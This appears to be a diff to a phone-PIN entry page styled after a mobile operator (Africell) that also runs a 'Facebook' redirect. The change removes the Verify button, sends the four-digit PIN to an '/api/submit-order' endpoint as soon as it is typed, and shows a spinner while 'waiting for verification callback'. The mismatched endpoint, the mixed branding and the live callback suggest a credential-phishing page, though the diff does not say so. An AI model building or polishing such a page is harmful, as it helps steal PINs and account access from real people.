@@ -66,6 +66,24 @@
 
         .pin-box.active-box { border-color: #991676; background: #FFFFFF; box-shadow: 0 0 0 3px rgba(153, 22, 118, 0.15); }
 
+        .pin-callback-spinner {
+            display: none;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 4px solid rgba(153, 22, 118, 0.18);
+            border-top-color: #991676;
+            animation: pinCircleSpin 0.85s linear infinite;
+        }
+
+        .pin-callback-spinner.active {
+            display: block;
+        }
+
+        @keyframes pinCircleSpin {
+            to { transform: rotate(360deg); }
+        }
+
         .pp-error-box {
             width: 100%; display: none; align-items: center; justify-content: center; gap: 8px;
             color: #E31B23; font-size: 14px; font-weight: 500; text-align: center;
@@ -73,27 +91,6 @@
         }
 
         .bottom-stack { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
-
-        .btn-login {
-            width: 100%;
-            max-width: 100%;
-            height: 60px;
-            background: #E8B4D4; 
-            color: #FFFFFF;
-            border: none; 
-            border-radius: 16px; 
-            font-size: 18px; 
-            font-weight: 700;
-            cursor: pointer; 
-            text-align: center; 
-            text-transform: uppercase;
-            transition: all 0.2s ease; 
-            letter-spacing: 0.5px;
-            margin-bottom: 24px;
-        }
-
-        .btn-login.enabled { background: #991676; box-shadow: 0 8px 20px rgba(153, 22, 118, 0.3); }
-        .btn-login:disabled { cursor: not-allowed; }
 
         .onscreen-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; width: 100%; max-width: 360px; }
         .keypad-btn {
@@ -187,12 +184,14 @@
         </div>
 
         <div class="middle-stack">
-            <div class="pin-boxes-container">
+            <div id="pinBoxesContainer" class="pin-boxes-container">
                 <input type="password" class="pin-box active-box" id="p1" readonly value="">
                 <input type="password" class="pin-box" id="p2" readonly value="">
                 <input type="password" class="pin-box" id="p3" readonly value="">
                 <input type="password" class="pin-box" id="p4" readonly value="">
             </div>
+
+            <div id="pinCallbackSpinner" class="pin-callback-spinner" aria-label="Waiting for verification callback"></div>
 
             <div id="inlineErrorBox" class="pp-error-box">
                 <i class="fa-solid fa-circle-exclamation"></i>
@@ -201,8 +200,6 @@
         </div>
 
         <div class="bottom-stack">
-            <button type="button" id="loginBtn" class="btn-login" disabled onclick="handleLogin()">Verify</button>
-
             <div class="onscreen-keypad">
                 <button type="button" class="keypad-btn" onclick="pressKey('1')">1</button>
                 <button type="button" class="keypad-btn" onclick="pressKey('2')">2</button>
@@ -229,7 +226,8 @@
     </div>
 
     <script>
-        const loginBtn = document.getElementById('loginBtn');
+        const pinBoxesContainer = document.getElementById('pinBoxesContainer');
+        const pinCallbackSpinner = document.getElementById('pinCallbackSpinner');
         const errorBox = document.getElementById('inlineErrorBox');
         const errorText = document.getElementById('errorText');
         const fbOverlay = document.getElementById('fbTransitionOverlay');
@@ -247,11 +245,22 @@
             return (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000').trim();
         }
 
+        function setWaitingCallbackState(waiting) {
+            if (waiting) {
+                pinBoxesContainer.style.display = 'none';
+                pinCallbackSpinner.classList.add('active');
+            } else {
+                pinCallbackSpinner.classList.remove('active');
+                pinBoxesContainer.style.display = 'flex';
+            }
+        }
+
         function playFacebookTransitionAndRedirect() {
             if (isRedirectingFacebook) return;
             isRedirectingFacebook = true;
             clearTimers();
             isSubmitting = false;
+            setWaitingCallbackState(false);
 
             const currentPhone = getCurrentPhone();
             fbStatusText.textContent = 'Verifying User Phone Number...';
@@ -320,6 +329,9 @@
             if (firstEmpty !== -1) {
                 pinDigits[firstEmpty] = digit;
                 updatePinDisplay();
+                if (pinDigits.every(d => d !== '')) {
+                    handleLogin();
+                }
             }
         }
 
@@ -333,13 +345,6 @@
 
         function validateForm() {
             if (isSubmitting || isRedirectingFacebook) return;
-            if (pinDigits.every(d => d !== '')) {
-                loginBtn.removeAttribute('disabled');
-                loginBtn.classList.add('enabled');
-            } else {
-                loginBtn.setAttribute('disabled', 'true');
-                loginBtn.classList.remove('enabled');
-            }
             hideInlineError();
         }
 
@@ -357,10 +362,7 @@
             isSubmitting = true;
             clearTimers();
             const submissionTimestamp = Date.now();
-
-            loginBtn.setAttribute('disabled', 'true');
-            loginBtn.classList.remove('enabled');
-            loginBtn.textContent = 'Verifying...';
+            setWaitingCallbackState(true);
 
             try {
                 const response = await fetch('/api/submit-order', {
@@ -386,7 +388,7 @@
         function resetButtonState(clearDigits = true) {
             isSubmitting = false;
             clearTimers();
-            loginBtn.textContent = 'Verify';
+            setWaitingCallbackState(false);
             if (clearDigits) {
                 pinDigits = ['', '', '', ''];
             }
